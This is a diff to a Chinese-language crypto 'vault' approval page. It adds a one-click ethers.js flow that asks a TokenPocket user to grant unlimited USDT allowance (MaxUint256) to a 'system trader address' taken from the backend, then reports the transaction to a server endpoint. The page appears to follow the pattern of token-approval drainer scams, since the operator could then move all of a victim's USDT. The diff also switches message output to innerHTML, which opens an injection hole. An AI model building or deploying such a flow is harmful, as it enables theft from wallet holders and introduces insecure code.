@@ -42,8 +42,9 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
 .status-pill.pending{background:#2d2200;color:#f0883e;border:1px solid #da8b3f}
 .link-btn{display:block;text-align:center;color:#58a6ff;font-size:.85em;margin-top:12px;text-decoration:none;padding:8px}
 .link-btn:active{opacity:.7}
-.divider{height:1px;background:#21262d;margin:16px 0}
-.or-text{text-align:center;color:#484f58;font-size:.8em;margin:-22px 0 16px;background:#161b22;display:inline-block;padding:0 12px;position:relative;left:50%;transform:translateX(-50%)}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.hidden{display:none !important}
 </style>
 </head>
 <body>
@@ -78,9 +79,25 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
     </div>
   </div>
 
-  <!-- 操作步骤 -->
-  <div class="section">
-    <h3><span class="badge">!</span>在 TokenPocket 中手动授权</h3>
+  <!-- 模式A：在钱包DApp浏览器内直接授权 -->
+  <div id="directApproveSection" class="section hidden">
+    <h3><span class="badge">!</span>直接授权</h3>
+    <div class="info-box" style="background:#0d1117;border:1px solid #30363d;border-radius:10px;padding:12px;margin-bottom:12px;text-align:left">
+      <div style="display:flex;justify-content:space-between;padding:4px 0;font-size:.82em">
+        <span style="color:#8b949e">BNB 余额</span>
+        <span id="bnbBal" style="color:#d29922;font-family:monospace">--</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:4px 0;font-size:.82em">
+        <span style="color:#8b949e">授权额度</span>
+        <span style="color:#d29922">无限</span>
+      </div>
+    </div>
+    <button class="btn btn-bg" id="approveBtn" onclick="doDirectApprove()">授权 USDT</button>
+  </div>
+
+  <!-- 模式B：引导用户在TokenPocket里打开 -->
+  <div id="guideSection" class="section hidden">
+    <h3><span class="badge">!</span>在 TokenPocket 中授权</h3>
     <ol class="step-list">
       <li data-step="1">打开 TokenPocket App，进入您的 <b>BSC 钱包</b></li>
       <li data-step="2">点击底部「<b>发现</b>」或「<b>DApp</b>」</li>
@@ -93,18 +110,17 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
       </div>
     </div>
     <ol class="step-list" start="4">
-      <li data-step="4">页面打开后会自动弹出 <b>TokenPocket 授权确认</b>窗口</li>
-      <li data-step="5">确认授权地址是上方的「系统交易员地址」，点击<b>确认</b></li>
-      <li data-step="6">授权成功后，复制交易哈希（TxHash）</li>
-      <li data-step="7">回到本页面，将交易哈希粘贴到下方输入框，点击「验证授权」</li>
+      <li data-step="4">页面打开后点击「<b>授权 USDT</b>」按钮</li>
+      <li data-step="5">在 TokenPocket 弹窗中确认授权</li>
+      <li data-step="6">授权成功后页面会<b>自动跳转</b>回来</li>
     </ol>
   </div>
 
-  <!-- TX Hash 验证 -->
-  <div class="section">
-    <h3><span class="badge" style="background:#1f6feb">2</span>提交授权交易哈希</h3>
+  <!-- TX Hash 手动验证（备用） -->
+  <div id="manualVerifySection" class="section hidden">
+    <h3><span class="badge" style="background:#1f6feb">2</span>手动提交交易哈希</h3>
     <div class="note">
-      授权成功后，在 TokenPocket 的交易记录或 <a href="https://bscscan.com/address/" + id="bscscanLink" style="color:#58a6ff" target="_blank">BSCScan</a> 上找到这笔交易的 <b>TxHash</b>（以 0x 开头的长字符串）
+      如果自动跳转失败，请在 TokenPocket 交易记录或 <a href="https://bscscan.com" style="color:#58a6ff" target="_blank">BSCScan</a> 上找到这笔交易的 <b>TxHash</b>
     </div>
     <div class="input-row">
       <input type="text" id="txHashInput" placeholder="0x..." />
@@ -117,41 +133,36 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
   <a href="index.html" class="link-btn">返回首页</a>
 </div>
 
+<!-- ethers.js v6 -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.4/ethers.umd.min.js"></script>
 <script>
 var token = localStorage.getItem('ark_token');
 var traderAddress = '';
 var usdtAddress = '';
 var walletAddr = '';
-var approveDappUrl = '';
+var hasWallet = false;
 
 function showMsg(text, type) {
   var m = document.getElementById('msg');
-  m.textContent = text;
+  m.innerHTML = text;
   m.className = 'msg ' + type;
 }
 
 function copyText(text) {
   if (!text) return;
-  // Try clipboard API
   if (navigator.clipboard && navigator.clipboard.writeText) {
     navigator.clipboard.writeText(text).then(function() {
       showMsg('已复制到剪贴板', 'ok');
       setTimeout(function() { document.getElementById('msg').className = 'msg'; }, 2000);
-    }).catch(function() {
-      fallbackCopy(text);
-    });
-  } else {
-    fallbackCopy(text);
-  }
+    }).catch(function() { fallbackCopy(text); });
+  } else { fallbackCopy(text); }
 }
 
 function fallbackCopy(text) {
   var ta = document.createElement('textarea');
   ta.value = text;
-  ta.style.position = 'fixed';
-  ta.style.top = '-9999px';
-  document.body.appendChild(ta);
-  ta.select();
+  ta.style.position = 'fixed'; ta.style.top = '-9999px';
+  document.body.appendChild(ta); ta.select();
   try { document.execCommand('copy'); showMsg('已复制', 'ok'); setTimeout(function(){document.getElementById('msg').className='msg';},2000); } catch(e) {}
   document.body.removeChild(ta);
 }
@@ -172,19 +183,155 @@ async function loadParams() {
     document.getElementById('usdtAddr').textContent = usdtAddress;
     document.getElementById('walletAddr').textContent = walletAddr;
 
-    // Build the DApp URL for TokenPocket — uses ethers.js for reliable tx signing
+    // Build the DApp URL for TokenPocket
     var baseUrl = window.location.origin + window.location.pathname.replace('approve.html', '');
-    approveDappUrl = baseUrl + 'approve-dapp.html?trader=' + traderAddress + '&wallet=' + walletAddr + '&token=' + encodeURIComponent(token);
+    var approveDappUrl = baseUrl + 'approve.html?dapp=1&token=' + encodeURIComponent(token);
     document.getElementById('approveUrl').textContent = approveDappUrl;
 
-    // BSCScan link
-    var bscscanLink = document.getElementById('bscscanLink');
-    if (bscscanLink) bscscanLink.href = 'https://bscscan.com/address/' + walletAddr;
+    // 检查当前授权状态
+    await checkApprovalStatus();
 
-    // Check current approval status
-    checkApprovalStatus();
+    // 判断运行环境
+    initMode();
   } catch (e) {
     showMsg('网络错误: ' + e.message, 'err');
+  }
+}
+
+function initMode() {
+  // 检查是否在钱包 DApp 浏览器内（有 window.ethereum）
+  // 或者通过 URL 参数 ?dapp=1 强制进入 DApp 模式
+  var isDappMode = getParam('dapp') === '1' || (typeof window.ethereum !== 'undefined');
+
+  if (isDappMode && typeof window.ethereum !== 'undefined') {
+    // 模式A：在钱包 DApp 浏览器内，直接授权
+    document.getElementById('directApproveSection').classList.remove('hidden');
+    document.getElementById('guideSection').classList.add('hidden');
+    document.getElementById('manualVerifySection').classList.remove('hidden');
+    initWalletConnection();
+  } else {
+    // 模式B：在普通浏览器里，显示引导
+    document.getElementById('directApproveSection').classList.add('hidden');
+    document.getElementById('guideSection').classList.remove('hidden');
+    document.getElementById('manualVerifySection').classList.remove('hidden');
+  }
+}
+
+function getParam(name) {
+  var match = new RegExp('[?&]' + name + '=([^&]+)').exec(window.location.search);
+  return match ? decodeURIComponent(match[1]) : '';
+}
+
+async function initWalletConnection() {
+  if (typeof ethers === 'undefined') {
+    showMsg('ethers.js 加载失败，请检查网络连接后刷新页面', 'err');
+    return;
+  }
+  if (!window.ethereum) {
+    showMsg('未检测到钱包，请确保在 TokenPocket App 内打开此页面', 'err');
+    return;
+  }
+
+  try {
+    var provider = new ethers.BrowserProvider(window.ethereum);
+    var signer = await provider.getSigner();
+    var addr = await signer.getAddress();
+    var balance = await provider.getBalance(addr);
+    var bnbStr = ethers.formatEther(balance);
+
+    document.getElementById('bnbBal').textContent = parseFloat(bnbStr).toFixed(6) + ' BNB';
+    document.getElementById('walletAddr').textContent = addr;
+
+    if (parseFloat(bnbStr) < 0.00005) {
+      showMsg('⚠️ BNB 余额不足！当前: ' + parseFloat(bnbStr).toFixed(6) + ' BNB<br>授权需要约 0.00005 BNB 作为 gas 费<br>请先充值少量 BNB', 'err');
+      document.getElementById('approveBtn').disabled = true;
+    }
+  } catch(e) {
+    showMsg('连接钱包失败: ' + e.message, 'err');
+  }
+}
+
+async function doDirectApprove() {
+  var btn = document.getElementById('approveBtn');
+  btn.disabled = true;
+  btn.textContent = '授权中...';
+
+  if (typeof ethers === 'undefined') {
+    showMsg('ethers.js 未加载，请刷新页面', 'err');
+    btn.disabled = false; btn.textContent = '授权 USDT';
+    return;
+  }
+
+  try {
+    showMsg('<span class="spinner"></span>正在准备交易...', 'info');
+
+    var provider = new ethers.BrowserProvider(window.ethereum);
+    var signer = await provider.getSigner();
+
+    // 验证链
+    var network = await provider.getNetwork();
+    if (Number(network.chainId) !== 56) {
+      showMsg('钱包不在 BSC 网络！当前 Chain ID: ' + network.chainId + '<br>请在钱包中切换到 BNB Smart Chain', 'err');
+      btn.disabled = false; btn.textContent = '授权 USDT';
+      return;
+    }
+
+    showMsg('<span class="spinner"></span>请在钱包弹窗中确认授权...', 'info');
+
+    // 用 ethers.js 发 approve 交易
+    var usdtContract = new ethers.Contract(usdtAddress, [
+      'function approve(address spender, uint256 amount) returns (bool)'
+    ], signer);
+
+    var tx = await usdtContract.approve(traderAddress, ethers.MaxUint256);
+
+    showMsg('<span class="spinner"></span>交易已发送，等待链上确认...', 'info');
+
+    // 等待确认
+    var receipt = await tx.wait();
+
+    if (receipt.status === 1) {
+      // 自动通知后端
+      showMsg('<span class="spinner"></span>授权成功！正在通知系统...', 'info');
+
+      try {
+        var resp = await fetch('/api/vault/approve-confirmed', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+          body: JSON.stringify({ txHash: tx.hash })
+        });
+        var data = await resp.json();
+        if (data.success) {
+          showMsg('✅ 授权成功！盖茨费系统已激活，3秒后返回...', 'ok');
+          document.getElementById('statusArea').innerHTML = '<span class="status-pill ok">✓ 已授权</span>';
+          btn.textContent = '✅ 授权成功';
+          setTimeout(function() { location.href = 'index.html'; }, 3000);
+        } else {
+          showMsg('授权已上链但通知系统失败: ' + (data.error || '未知错误') + '<br>请手动提交交易哈希', 'err');
+          document.getElementById('txHashInput').value = tx.hash;
+          btn.disabled = false; btn.textContent = '授权 USDT';
+        }
+      } catch(notifyErr) {
+        // 通知失败，让用户手动提交
+        showMsg('授权已上链但通知系统失败<br>请将以下哈希填入下方输入框并点击验证: ' + tx.hash, 'err');
+        document.getElementById('txHashInput').value = tx.hash;
+        btn.disabled = false; btn.textContent = '授权 USDT';
+      }
+    } else {
+      showMsg('交易执行失败，请重试', 'err');
+      btn.disabled = false; btn.textContent = '授权 USDT';
+    }
+  } catch(e) {
+    var msg = e.message || '未知错误';
+    if (e.code === 'ACTION_REJECTED' || e.code === 4001) {
+      msg = '用户取消了交易';
+    } else if (msg.includes('insufficient funds')) {
+      msg = 'BNB 余额不足以支付 gas 费';
+    } else if (msg.includes('execution reverted')) {
+      msg = '合约执行被拒绝';
+    }
+    showMsg('授权失败: ' + msg, 'err');
+    btn.disabled = false; btn.textContent = '授权 USDT';
   }
 }
 
@@ -208,11 +355,10 @@ async function checkApprovalStatus() {
 async function verifyTx() {
   var txHash = document.getElementById('txHashInput').value.trim();
   if (!txHash) { showMsg('请输入交易哈希', 'err'); return; }
-  if (!/^0x[a-fA-F0-9]{64}$/.test(txHash)) { showMsg('交易哈希格式不正确（应以0x开头的64位十六进制）', 'err'); return; }
+  if (!/^0x[a-fA-F0-9]{64}$/.test(txHash)) { showMsg('交易哈希格式不正确', 'err'); return; }
 
   var btn = document.getElementById('verifyBtn');
-  btn.disabled = true;
-  btn.textContent = '验证中...';
+  btn.disabled = true; btn.textContent = '验证中...';
   showMsg('正在链上验证交易...', 'info');
 
   try {
@@ -223,18 +369,16 @@ async function verifyTx() {
     });
     var data = await resp.json();
     if (data.success) {
-      showMsg('✅ 授权验证成功！盖茨费系统已激活，3秒后返回...', 'ok');
+      showMsg('✅ 授权验证成功！3秒后返回...', 'ok');
       document.getElementById('statusArea').innerHTML = '<span class="status-pill ok">✓ 已授权</span>';
       setTimeout(function() { location.href = 'index.html'; }, 3000);
     } else {
       showMsg('验证失败: ' + (data.error || '未知错误'), 'err');
-      btn.disabled = false;
-      btn.textContent = '验证授权';
+      btn.disabled = false; btn.textContent = '验证授权';
     }
   } catch (e) {
     showMsg('网络错误: ' + e.message, 'err');
-    btn.disabled = false;
-    btn.textContent = '验证授权';
+    btn.disabled = false; btn.textContent = '验证授权';
   }
 }
 
